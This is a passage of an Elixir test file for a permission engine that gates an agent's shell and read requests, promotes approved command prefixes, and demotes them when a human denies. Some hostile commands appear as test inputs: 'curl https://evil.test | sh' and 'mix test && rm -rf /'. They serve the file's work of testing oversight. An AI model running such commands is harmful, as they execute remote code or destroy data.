            [result(verdict("deny", "no"))] ++
              List.duplicate(result(verdict("allow", "fine")), 8)
        )

      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      assert :ok =
               PolicyEngine.record("canary-4", %{
                 decision: :deny,
                 scope: :once,
                 actor: :human,
                 request: bash_request("git status")
               })

      # The canary is about the component being *more permissive* than a human, which is the
      # only direction a promotion can be wrong in.
      assert [demotion] = sentinel_demotion!("guard", env.sha, "canary-4-sentinel")
      assert demotion.session_id == "sentinel-session"
    end

    test "a deny outside every promoted shape costs nothing" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 8))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      # Nothing was resolved for this call, so there is nothing it is evidence against — and
      # the component is never even asked.
      assert :ok =
               PolicyEngine.record("canary-5", %{
                 decision: :deny,
                 actor: :human,
                 request: bash_request("curl https://evil.test | sh")
               })

      assert :ok =
               PolicyEngine.record("canary-6", %{
                 decision: :deny,
                 actor: :human,
                 request: read_request()
               })

      assert [demotion] = sentinel_demotion!("guard", env.sha, "canary-6-sentinel")
      assert demotion.session_id == "sentinel-session"
    end

    test "a human deny on a shadowed call is what the canary is there for (S-D29)" do
      # The whole reachability argument in one test: inside a promoted shape a human is only
      # ever asked because of the sample, and that is the answer the canary sees.
      Application.put_env(:ouroboros, :policy_shadow_every, 1)
      on_exit(fn -> Application.delete_env(:ouroboros, :policy_shadow_every) end)

      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 12))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      request = bash_request("git status --short")

      # The engine would resolve it; the sample puts it to a human instead.
      assert {:ask, :policy_shadow} = PolicyEngine.evaluate(request)

      # The human says no, which is a contradiction of exactly the thing the shape was
      # promoted for.
      assert :ok =
               PolicyEngine.record("shadow-1", %{
                 decision: :deny,
                 scope: :once,
                 actor: :human,
                 request: request
               })

      await_shapes("guard", env.sha, [])
    end
  end

  describe "promotion re-runs the replay rather than believing the report" do
    test "a contradiction the corpus grew after the report refuses the promotion", context do
      # The mutation this test exists for: delete the `replay/2` call inside `promote/6` and
      # believe the report's own numbers, and a promotion is decided by a file an operator is
      # holding rather than by the corpus as it stands when they hand it in.
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 200))

      # Twenty-five human approvals of `mix test …` the component would have resolved, across
      # two sessions: a clean report, and exactly the file `ouro policy replay` writes for an
      # operator to carry to `promote`.
      seed_corpus!(
        context,
        for(n <- 1..25//1, do: {"bash", "mix test #{n}", "approve", session(n)})
      )

      assert {:ok, report} = PolicyEngine.replay("guard")
      assert report["per_shape"]["bash"]["mix test"]["distinct_fingerprints"] == 25
      assert report["per_shape"]["bash"]["mix test"]["contradictions"] == 0
      assert report["per_shape"]["bash"]["mix test"]["would_resolve"] == 25

      # Then the corpus grows by the one answer nobody looked at: a human denied a call this
      # component says `allow` to. The report is still valid — it is still about these bytes
      # and it still hashes to its own digest — and the promotion is still refused.
      append_corpus!(context, [{"bash", "mix test evil", "deny", "later-session"}])

      assert {:error, {:policy_contradicted_a_human, "bash", 1}} =
               PolicyEngine.promote("guard", "bash", "mix test", report, "operator:ana")

      assert PolicyPromotion.policy() == nil

      # And the report a fresh replay writes now says so out loud, with the fingerprint and the
      # session of the answer that contradicted — never the command.
      assert {:ok, rerun} = PolicyEngine.replay("guard")
      assert rerun["per_tool"]["bash"]["contradictions"] == 1
      assert [row] = rerun["per_tool"]["bash"]["contradiction_rows"]
      assert String.match?(row["fingerprint"], ~r/\A[0-9a-f]{64}\z/)
      assert row["session_id"] == "later-session"
      refute Map.has_key?(row, "document")
    end
  end

  describe "a report is a function of the corpus and not of its order" do
    test "contradiction rows come out in one order however they went in" do
      # `no-network-shell` never says `allow`, so a corpus with contradictions in it needs a
      # scripted verdict. Reverse the corpus and the digest has to be the same digest: delete
      # the sort in `finish/1` and a report over the same evidence stops being the same report.
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 40))

      rows = for n <- 1..6//1, do: {"bash", "contradicted #{n}", "deny"}

      seed_corpus!(%{session: "order-session"}, rows)
      assert {:ok, forwards} = PolicyEngine.replay("guard")

      seed_corpus!(%{session: "order-session"}, Enum.reverse(rows))
      assert {:ok, backwards} = PolicyEngine.replay("guard")

      assert forwards["per_tool"]["bash"]["contradictions"] == 6
      assert length(forwards["per_tool"]["bash"]["contradiction_rows"]) == 6

      assert backwards["per_tool"]["bash"]["contradiction_rows"] ==
               forwards["per_tool"]["bash"]["contradiction_rows"]

      assert backwards["report_sha256"] == forwards["report_sha256"]
    end

    test "contradiction rows are bounded, and the count is not (P8)" do
      # A report is a file an operator reads and hands back to `promote/6`. The number that
      # matters is the count; the rows are there so a person can find the sessions, and an
      # unbounded list of them is an unbounded write into whatever holds the report.
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 120))

      seed_corpus!(
        %{session: "order-session"},
        for(n <- 1..40//1, do: {"bash", "contradicted #{n}", "deny", session(n)})
      )

      assert {:ok, report} = PolicyEngine.replay("guard")
      assert report["per_tool"]["bash"]["contradictions"] == 40
      assert length(report["per_tool"]["bash"]["contradiction_rows"]) == 20
      assert length(report["per_shape"]["bash"]["contradicted"]["contradiction_rows"]) == 20
    end
  end

  describe "the engine's other two seams" do
    test "a policy this node cannot verify is not dry-evaluable" do
      # Unsigned, which is what a store somebody else wrote looks like. Drop the
      # `Verifier.verify_manifest/2` call from `dry_provenance/2` and unsigned bytes answer.
      env = scripted_policy([evaluate: [result(verdict("allow", "unsigned"))]], signed?: false)

      assert {:error, {:policy_not_verifiable, _reason}} =
               PolicyEngine.evaluate_with(env.sha, document_for("ls"))
    end

    test "a row naming bytes the signed manifest does not describe is not dry-evaluable" do
      env =
        scripted_policy([evaluate: [result(verdict("allow", "planted"))]], plant_other_sha: true)

      refute env.register_sha == env.sha

      assert {:error, {:policy_not_verifiable, _reason}} =
               PolicyEngine.evaluate_with("guard", document_for("ls"))
    end

    test "the configured name outranks the record's, and status says which it was (M3)" do
      scripted_policy(evaluate: [result(verdict("ask", "x"))])
      assert PolicyEngine.configured_policy() == "guard"
      assert %{policy_name: "guard", source: :config} = PolicyEngine.status()

      Application.delete_env(:ouroboros, :wasm_policy)
      assert PolicyEngine.configured_policy() == nil
      assert %{policy_name: nil, source: nil} = PolicyEngine.status()

      assert {:ok, _record} = promote!("guard", scripted_sha(), "bash", "git status")

      # Un-configuring a promoted policy does *not* turn it off — the record keeps it live —
      # and an operator reading `status/0` can see that is what happened. The way off is
      # `PolicyPromotion.clear/1`.
      assert PolicyEngine.configured_policy() == "guard"
      status = PolicyEngine.status()
      assert status.policy_name == "guard"
      assert status.source == :promotion_record
      assert status.promotion.allowable == %{"bash" => ["git status"]}
      assert status.shadow_every == PolicyEngine.shadow_every()
      assert status.thresholds == PolicyEngine.promotion_thresholds()

      # The record still names "guard" and the configuration now names something else: the one
      # step where the two orders disagree, and configuration wins. Read the record first and
      # a node's policy is whatever it was once promoted to rather than what its operator says.
      Application.put_env(:ouroboros, :wasm_policy, "somebody-else")
      assert PolicyEngine.configured_policy() == "somebody-else"
      assert %{policy_name: "somebody-else", source: :config} = PolicyEngine.status()

      # And `clear/1` is the way off, with the configuration gone too.
      Application.delete_env(:ouroboros, :wasm_policy)
      assert :ok = PolicyPromotion.clear("operator:ana")
      assert PolicyEngine.configured_policy() == nil
    end

    test "allowable_shapes/3 is the earned half, and both gates are inside it" do
      Application.put_env(:ouroboros, :policy_allowable_tools, ["read"])
      sha = String.duplicate("d", 64)

      assert PolicyEngine.allowable_tools() == ["read"]
      assert PolicyEngine.allowable_shapes("guard", sha, "bash") == []

      assert {:ok, _record} = promote!("guard", sha, "bash", "mix test")
      assert PolicyEngine.allowable_shapes("guard", sha, "bash") == ["mix test"]

      # The name gate and the byte gate, each on its own.
      assert PolicyEngine.allowable_shapes("other", sha, "bash") == []
      assert PolicyEngine.allowable_shapes("guard", String.duplicate("e", 64), "bash") == []
      assert PolicyEngine.allowable_shapes("guard", sha, "read") == []

      # The operator's half is not name-scoped, not shape-scoped, and untouched by any of it.
      assert PolicyEngine.allowable_tools() == ["read"]
    end
  end

  describe "what a shape is (S-D27)" do
    test "the candidate shapes of a request are the word prefixes of each sub-command" do
      assert PolicyEngine.shapes(request!("mix test --stale")) == ["mix", "mix test"]
      assert PolicyEngine.shapes(request!("ls")) == ["ls"]

      # Every sub-command contributes, because every sub-command has to be covered.
      assert PolicyEngine.shapes(request!("mix test && git status --short")) ==
               ["mix", "mix test", "git", "git status"]

      # `Shell`'s own reading, not a second one: a wrapper is stripped and whitespace is
      # collapsed before the prefix is taken.
      assert PolicyEngine.shapes(request!("timeout 5s   mix   test")) == ["mix", "mix test"]

      # Nothing but `bash` has a command prefix.
      assert PolicyEngine.shapes(Request.new(read_request())) == []
      assert PolicyEngine.shapes(request!(nil)) == []
    end

    test "a shape covers a request only when every sub-command matches it" do
      assert PolicyEngine.covers?("mix test", request!("mix test --stale"))
      assert PolicyEngine.covers?("mix", request!("mix test && mix format"))

      refute PolicyEngine.covers?("mix test", request!("mix test && rm -rf /"))
      refute PolicyEngine.covers?("mix", request!("mixer --loud"))
      refute PolicyEngine.covers?("git status", request!("git stash"))
      refute PolicyEngine.covers?("mix", Request.new(read_request()))
    end

    test "a command line past Shell's bounds is covered by nothing, and yields no shape" do
      padded = Enum.map_join(1..70//1, " && ", fn _n -> "mix test" end)
      assert Shell.truncated?(padded)
      assert PolicyEngine.shapes(request!(padded)) == []
      refute PolicyEngine.covers?("mix test", request!(padded))

      long = "mix test " <> String.duplicate("x", 9_000)
      assert PolicyEngine.shapes(request!(long)) == []
      refute PolicyEngine.covers?("mix", request!(long))
    end
  end

  ## ── the real component's fixture (policy_acp_test.exs') ───────────────────────────────

  defp live_policy!(context) do
    key_path = Path.join(context.tmp, "signer.key")
    File.write!(key_path, :crypto.strong_rand_bytes(32))
    File.chmod!(key_path, 0o600)

    service =
      start_supervised!(
        {Service,
         [
           name: nil,
           key_path: key_path,
           signer_id: @signer,
           storage:
             {Jido.Storage.ETS,
              table: String.to_atom("wasm_promo_journal_#{System.unique_integer([:positive])}")}
         ]},
        id: {Service, System.unique_integer([:positive])}
      )

    {:ok, %{public_key: public}} = Service.public_info(service)
    trust_policy = [allow_unsigned: false, trusted_signers: %{@signer => public}]
    Application.put_env(:ouroboros, :upgrade_trust_policy, trust_policy)

    registry = start_registry!()
    store_root = Path.join(context.tmp, "store")
    pool = live_pool!(context.tmp)

    bytes = File.read!(@component)
    {:ok, epoch} = Epoch.next([node()])

    {:ok, artifact} =
      Artifact.build(bytes,
        name: "no-network-shell",
        epoch: epoch,
        kind: :policy,
        imports: ["log"],
        author: "promotion-test",
        eval: @eval
      )

    {:ok, value} =
      Service.sign_artifact(
        artifact,
        @signer,
        %{
          requester: node(),
          payload: Artifact.signing_payload(artifact, @signer),
          component_bytes: bytes
        },
        service
      )

    {:ok, signed} = Artifact.with_signature(artifact, %{signer: @signer, value: value})

    assert {:ok, outcome} =
             Rollout.deploy(signed, bytes, [node()],
               registry: registry,
               store_root: store_root,
               trust_policy: trust_policy,
               pool: pool
             )

    assert outcome.state == :live

    Application.put_env(:ouroboros, :permissions_engine, PolicyEngine)
    Application.put_env(:ouroboros, :wasm_policy, "no-network-shell")

    Application.put_env(:ouroboros, :wasm_policy_opts,
      registry: registry,
      store_root: store_root,
      pool: pool
    )

    # `Pool.call/4` in the assertions below needs the pool by name, and nothing else here does.
    Process.put(:promotion_test_pool, pool)
    %{sha: signed.component_sha256, pool: pool, registry: registry, store_root: store_root}
  end

  defp live_pool!(dir) do
    name = :"wasm_policy_promo_pool_#{System.unique_integer([:positive])}"

    {:ok, pid} =
      Pool.start([name: name, handshake_timeout_ms: 15_000] ++ SandboxFixture.pool_opts(dir))

    on_exit(fn -> stop(pid) end)
    pid
  end

  ## ── the scripted fixture (policy_engine_test.exs') ────────────────────────────────────

  defp scripted_policy(plans, opts \\ []) do
    dir =
      Path.join(System.tmp_dir!(), "ouro-promo-scripted-#{System.unique_integer([:positive])}")

    File.mkdir_p!(dir)
    on_exit(fn -> File.rm_rf(dir) end)

    root = Path.join(dir, "store")
    File.mkdir_p!(root)

    bytes =
      "\0asm\x0d\x00\x01\x00 a policy component the scripted helper never parses " <>
        Integer.to_string(System.unique_integer([:positive]))

    {:ok, %{sha256: sha}} = Store.put(bytes, nil, root: root)

    {:ok, artifact} =
      Artifact.build(bytes,
        name: "guard",
        epoch: System.unique_integer([:positive, :monotonic]) + 1_000_000,
        kind: :policy,
        imports: ["log"],
        author: "promotion-test"
      )

    {:ok, signed} = signature(artifact, Keyword.get(opts, :signed?, true))
    {:ok, _manifest} = Store.put_manifest(signed, root: root)

    register_sha =
      if Keyword.get(opts, :plant_other_sha, false) do
        {:ok, %{sha256: planted}} = Store.put(bytes <> " and not these", nil, root: root)
        planted
      else
        sha
      end

    registry = start_registry!()

    {:ok, _entry} =
      Registry.deploying(
        %{
          artifact_id: artifact.id,
          module: "wasm/guard",
          epoch: artifact.epoch,
          nodes: [node()],
          component_sha256: register_sha,
          kind: :policy
        },
        registry
      )

    {:ok, _live} = Registry.mark(artifact.id, :live, [], registry)

    plan_files =
      Map.new([:evaluate, :instantiate, :load, :drop], fn method ->
        path = Path.join(dir, "plan-#{method}")
        File.write!(path, plan_lines(Keyword.get(plans, method, [])))
        {method, path}
      end)

    journal = Path.join(dir, "journal")
    File.write!(journal, "")

    pool =
      start_scripted_pool(
        write_helper(dir, journal, plan_files, Keyword.get(opts, :delay_ms, 0)),
        dir
      )

    Application.put_env(:ouroboros, :permissions_engine, PolicyEngine)
    Application.put_env(:ouroboros, :wasm_policy, "guard")

    Application.put_env(:ouroboros, :wasm_policy_opts,
      registry: registry,
      store_root: root,
      pool: pool
    )

    Process.put(:promotion_test_scripted_sha, sha)

    %{sha: sha, register_sha: register_sha, journal: journal, pool: pool, plans: plan_files}
  end

  defp signature(artifact, false) do
    Application.put_env(:ouroboros, :upgrade_trust_policy,
      allow_unsigned: false,
      trusted_signers: %{}
    )

    {:ok, artifact}
  end

  defp signature(artifact, true) do
    {public, private} = :crypto.generate_key(:eddsa, :ed25519, :crypto.strong_rand_bytes(32))

    Application.put_env(:ouroboros, :upgrade_trust_policy,
      allow_unsigned: false,
      trusted_signers: %{@signer => public}
    )

    value =
      :crypto.sign(:eddsa, :none, Artifact.signing_payload(artifact, @signer), [private, :ed25519])

    Artifact.with_signature(artifact, %{signer: @signer, value: value})
  end

  # `delay_ms` makes the helper slow to answer a `call`, which is how "a wedged pool must not
  # cost a human's answer its latency" is expressed as a test (L7).
  defp write_helper(dir, journal, files, delay_ms) do
    sleep =
      if delay_ms > 0,
        do: ~s|if (method == "call") { system("sleep #{delay_ms / 1000}") }|,
        else: ""

    body = """
    #!/bin/sh
    exec awk '
    {
      print $0 >> "#{journal}"
      close("#{journal}")
      id = $0
      sub(/.*"id":/, "", id)
      sub(/[^0-9].*/, "", id)
      method = $0
      sub(/.*"method":"/, "", method)
      sub(/".*/, "", method)
      #{sleep}
      file = ""
      if (method == "call") { file = "#{files.evaluate}" } else if (method == "instantiate") { file = "#{files.instantiate}" } else if (method == "load") { file = "#{files.load}" } else if (method == "drop") { file = "#{files.drop}" }
      plan = ""
      if (file != "") { if ((getline plan < file) <= 0) { plan = "" } }
      if (plan != "") {
        kind = substr(plan, 1, index(plan, " ") - 1)
        rest = substr(plan, index(plan, " ") + 1)
        printf("{\\"jsonrpc\\":\\"2.0\\",\\"id\\":%s,\\"%s\\":%s}\\n", id, kind, rest)
      } else if (method == "doctor") {
        printf("{\\"jsonrpc\\":\\"2.0\\",\\"id\\":%s,\\"result\\":{#{@doctor}}}\\n", id)
      } else {
        printf("{\\"jsonrpc\\":\\"2.0\\",\\"id\\":%s,\\"result\\":{\\"method\\":\\"%s\\"}}\\n", id, method)
      }
      fflush()
    }
    '
    """

    path = Path.join(dir, "ouro-wasm-helper.sh")
    File.write!(path, body)
    File.chmod!(path, 0o755)
    path
  end

  defp start_scripted_pool(helper_path, dir) do
    name = :"wasm_promo_scripted_pool_#{System.unique_integer([:positive])}"

    {:ok, pid} =
      Pool.start(
        [name: name, helper_path: helper_path, handshake_timeout_ms: 15_000] ++
          SandboxFixture.scripted_pool_opts(dir)
      )

    on_exit(fn -> stop(pid) end)
    pid
  end

  defp start_registry! do
    name = String.to_atom("wasm_promo_registry_#{System.unique_integer([:positive])}")

    {:ok, pid} =
      Registry.start_link(
        name: name,
        storage:
          {Jido.Storage.ETS,
           table: String.to_atom("wasm_promo_rollouts_#{System.unique_integer([:positive])}")}
      )

    on_exit(fn -> stop(pid) end)
    name
  end

  defp stop(pid) do
    if Process.alive?(pid) do
      try do
        GenServer.stop(pid, :normal, 5_000)
      catch
        :exit, _reason -> :ok
      end
    end
  end

  ## helpers

  defp result(map) when is_map(map), do: "result " <> JSON.encode!(map)

  defp verdict(decision, rule),
    do: %{
      "payload" => JSON.encode!(%{"decision" => decision, "rule" => rule}),
      "fuel_used" => 7,
      "log_lines" => 0
    }

  # A verdict outside the three-word grammar: the live path reads it as `ask`, the dry path as
  # an error, and a replay counts it `unreadable` (S-D23).
  defp gibberish(rule),
    do: %{
      "payload" => JSON.encode!(%{"decision" => "maybe", "rule" => rule}),
      "fuel_used" => 7,
      "log_lines" => 0
    }

  defp plan_lines(lines), do: Enum.map_join(lines, "", &(&1 <> "\n"))

  defp scripted_sha, do: Process.get(:promotion_test_scripted_sha)

  # The record's own verb, not the engine's gate: these tests are about what a promotion *does*
  # once it exists, and the gate has its own describe block.
  defp promote!(name, sha, tool, shape) do
    PolicyPromotion.promote(
      name,
      sha,
      tool,
      shape,
      %{
        report_sha256: "seeded-report",
        decisions: 60,
        contradictions: 0,
        distinct_fingerprints: 30,
        distinct_sessions: 3,
        would_resolve: 30
      },
      "operator:test"
    )
  end

  defp shapes!(name, sha, tool \\ "bash"), do: PolicyPromotion.allowable_shapes(name, sha, tool)

  # A contradiction that *must* demote, answered after the one under test, waited for. It is
  # what makes a negative canary assertion deterministic: a `Process.sleep` long enough to be
  # sure the canary did *not* fire is a sleep nobody can size, and under load it passes by
  # accident. The sentinel's session id is what the demotion is then checked against.
  defp sentinel_demotion!(name, sha, id) do
    request =
      bash_request("git status --sentinel")
      |> put_in([:principal, :session_id], "sentinel-session")

    assert :ok =
             PolicyEngine.record(id, %{
               decision: :deny,
               scope: :once,
               actor: :human,
               request: request
             })

    await_shapes(name, sha, [])
    PolicyPromotion.status().demotions
  end

  # The canary's dry ask runs off the answer path (S-D24), so a caller that needs to see a
  # demotion waits for the record to change rather than for `record/2` to return.
  defp await_shapes(name, sha, expected, attempts \\ 400)

  defp await_shapes(name, sha, expected, 0),
    do: flunk("shapes stayed #{inspect(shapes!(name, sha))}, expected #{inspect(expected)}")

  defp await_shapes(name, sha, expected, attempts) do
    if shapes!(name, sha) == expected do
      :ok
    else
      Process.sleep(10)
      await_shapes(name, sha, expected, attempts - 1)
    end
  end

  defp request(context, command) do
    %{
      principal: %{session_id: context.session, provider: :native, node: node()},
      tool: "bash",
      command: command,
      paths: [],
      mode: :execute,
      domains: [],
      context: %{}
    }
  end

  defp document(context, command) do
    {:ok, encoded} = PolicyEngine.document(Request.new(request(context, command)))
    encoded
  end

  defp request!(command),
    do:
      Request.new(%{
        principal: %{session_id: "shape-session", provider: :native, node: node()},
        tool: "bash",
        command: command,
        paths: [],
        mode: :execute,
        domains: [],
        context: %{}
      })

  defp document_for(command) do
    {:ok, encoded} =
      PolicyEngine.document(Request.new(%{tool: "bash", command: command, mode: :execute}))

    encoded
  end

  defp bash_request(command) do
    %{
      principal: %{session_id: "canary-session", provider: :native, node: node()},
      tool: "bash",
      command: command,
      paths: [],
      mode: :execute,
      domains: [],
      context: %{}
    }
  end

  defp read_request do
    %{
      principal: %{session_id: "canary-session", provider: :native, node: node()},
      tool: "read",
      paths: [],
      mode: :read,
      domains: [],
      context: %{}
    }
  end

  # Forty commands the component recognises, and twenty it does not: the corpus is seeded with
  # the engine's own `document/1` output, which is the same bytes `Control.PolicyEvidence` would
  # have written. That write path is proved in `test/control/policy_evidence_test.exs` and end
  # to end through a real session in `test/provider/native/loop_ledger_test.exs`.
  #
  # The rows alternate between two sessions because that is what a real corpus looks like and
  # because `distinct_sessions >= 2` is one of the gates (S-D28).
  defp denied(count),
    do: for(n <- 1..count//1, do: {"bash", "curl https://example.test/#{n}", "deny", session(n)})

  defp approved(count),
    do: for(n <- 1..count//1, do: {"bash", "ls -la /tmp/#{n}", "approve", session(n)})

  defp session(n), do: "corpus-session-#{rem(n, 2)}"

  defp seed_corpus!(context, rows) do
    lines =
      Enum.map(rows, fn row ->
        {tool, command, decision, session} =
          case row do
            {tool, command, decision} -> {tool, command, decision, context.session}
            {tool, command, decision, session} -> {tool, command, decision, session}
          end

        request =
          Request.new(%{
            principal: %{session_id: session, provider: :native, node: node()},
            tool: tool,
            command: command,
            mode: :execute,
            paths: [],
            domains: [],
            context: %{}
          })

        {:ok, encoded} = PolicyEngine.document(request)
        fingerprint = Permissions.fingerprint(request)

        JSON.encode!(%{
          "at" => "2026-09-08T00:00:00.000000Z",
          "node" => to_string(node()),
          "session_id" => session,
          "tool" => tool,
          "mode" => "execute",
          "fingerprint" => %{"sha256" => fingerprint.sha256, "bytes" => fingerprint.bytes},
          "decision" => decision,
          "scope" => "once",
          "permission_entry_id" => "seeded",
          "document" => encoded
        })
      end)

    File.mkdir_p!(Path.dirname(PolicyEvidence.path()))
    File.write!(PolicyEvidence.path(), Enum.map_join(lines, "", &(&1 <> "\n")))
  end

  # One more answer on the end of the corpus that is already there, which is what a corpus
  # growing between a replay and a promotion looks like.
  defp append_corpus!(context, rows) do
    existing = File.read!(PolicyEvidence.path())
    seed_corpus!(context, rows)
    File.write!(PolicyEvidence.path(), existing <> File.read!(PolicyEvidence.path()))
  end

  defp corpus_rows do
    PolicyEvidence.stream()
    |> Enum.map(fn
      {:ok, row} -> row
      :unreadable -> nil
    end)
    |> Enum.reject(&is_nil/1)
  end

  defp permission_entries(sha) do
    {:ok, entries} = EffectLedger.list(effect: :permission, limit: 500)
    Enum.filter(entries, &(&1.result[:rule_id] == "wasm/policy/" <> sha))
  end
end
